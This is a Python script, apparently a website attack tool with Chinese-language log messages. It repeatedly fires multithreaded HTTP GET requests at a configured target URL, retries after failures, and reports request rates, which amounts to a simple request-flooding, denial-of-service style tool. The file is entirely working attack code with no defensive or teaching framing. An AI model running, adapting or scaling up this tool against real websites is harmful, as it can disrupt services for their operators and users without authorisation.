import requests
import time
import json
import threading
from datetime import datetime
import signal
import sys

class WebAttackTool:
    def __init__(self, config_file="config.json"):
        self.running = True
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.start_time = datetime.now()
        
        # Load configuration
        self.load_config(config_file)
        
        # Setup signal handler for graceful shutdown
        signal.signal(signal.SIGINT, self.signal_handler)
    
    def load_config(self, config_file):
        """Load configuration from JSON file"""
        default_config = {
            "target_url": "https://example.com",
            "delay_between_requests": 2,
            "retry_delay": 5,
            "max_retries": 5,
            "timeout": 10,
            "user_agent": "WebAttackTool/1.0",
            "threads": 1,
            "headers": {},
            "log_file": "attack_log.txt"
        }
        
        try:
            with open(config_file, 'r', encoding='utf-8') as f:
                self.config = json.load(f)
        except FileNotFoundError:
            print(f"Config file {config_file} not found, using defaults")
            self.config = default_config
            self.save_config(config_file)
        except json.JSONDecodeError:
            print(f"Invalid JSON in {config_file}, using defaults")
            self.config = default_config
    
    def save_config(self, config_file):
        """Save current configuration to JSON file"""
        with open(config_file, 'w', encoding='utf-8') as f:
            json.dump(self.config, f, indent=2, ensure_ascii=False)
    
    def log_event(self, message):
        """Log events to file and console"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_message = f"[{timestamp}] {message}"
        
        print(log_message)
        
        try:
            with open(self.config["log_file"], 'a', encoding='utf-8') as f:
                f.write(log_message + "\n")
        except Exception as e:
            print(f"Failed to write to log file: {e}")
    
    def make_request(self):
        """Make a single HTTP request"""
        headers = {
            "User-Agent": self.config["user_agent"],
            **self.config["headers"]
        }
        
        try:
            response = requests.get(
                self.config["target_url"],
                headers=headers,
                timeout=self.config["timeout"]
            )
            
            self.total_requests += 1
            self.successful_requests += 1
            
            self.log_event(
                f"成功請求 #{self.total_requests} | "
                f"狀態碼: {response.status_code} | "
                f"響應時間: {response.elapsed.total_seconds():.2f}s | "
                f"響應大小: {len(response.content)} bytes"
            )
            
            return True, response.status_code
            
        except requests.RequestException as e:
            self.total_requests += 1
            self.failed_requests += 1
            
            self.log_event(
                f"失敗請求 #{self.total_requests} | "
                f"錯誤: {str(e)}"
            )
            
            return False, str(e)
    
    def attack_loop(self, thread_id=0):
        """Main attack loop for a single thread"""
        consecutive_failures = 0
        max_consecutive_failures = self.config["max_retries"]
        
        while self.running:
            success, result = self.make_request()
            
            if success:
                consecutive_failures = 0
                time.sleep(self.config["delay_between_requests"])
            else:
                consecutive_failures += 1
                
                if consecutive_failures >= max_consecutive_failures:
                    self.log_event(
                        f"線程 {thread_id} 達到最大連續失敗次數 ({max_consecutive_failures})，暫停30秒"
                    )
                    time.sleep(30)
                    consecutive_failures = 0
                else:
                    time.sleep(self.config["retry_delay"])
    
    def start_attack(self):
        """Start the attack with multiple threads if configured"""
        self.log_event(f"開始攻擊目標: {self.config['target_url']}")
        self.log_event(f"使用線程數: {self.config['threads']}")
        
        threads = []
        
        for i in range(self.config["threads"]):
            thread = threading.Thread(target=self.attack_loop, args=(i,))
            thread.daemon = True
            threads.append(thread)
            thread.start()
        
        # Status reporting loop
        try:
            while self.running:
                time.sleep(10)  # Report every 10 seconds
                elapsed = datetime.now() - self.start_time
                rate = self.total_requests / elapsed.total_seconds() if elapsed.total_seconds() > 0 else 0
                
                self.log_event(
                    f"統計報告 | 總請求: {self.total_requests} | "
                    f"成功: {self.successful_requests} | "
                    f"失敗: {self.failed_requests} | "
                    f"成功率: {(self.successful_requests/self.total_requests*100):.1f}% | "
                    f"請求速率: {rate:.2f} req/s"
                )
                
        except KeyboardInterrupt:
            self.signal_handler(signal.SIGINT, None)
    
    def signal_handler(self, sig, frame):
        """Handle Ctrl+C gracefully"""
        self.running = False
        elapsed = datetime.now() - self.start_time
        
        self.log_event("\n=== 攻擊結束 ===")
        self.log_event(f"總運行時間: {elapsed}")
        self.log_event(f"總請求數: {self.total_requests}")
        self.log_event(f"成功請求: {self.successful_requests}")
        self.log_event(f"失敗請求: {self.failed_requests}")
        self.log_event(f"平均請求速率: {self.total_requests/elapsed.total_seconds():.2f} req/s")
        
        sys.exit(0)

if __name__ == "__main__":
    print("=== 網站攻擊測試工具 ===")
    print("按 Ctrl+C 停止攻擊")
    
    tool = WebAttackTool()
    tool.start_attack()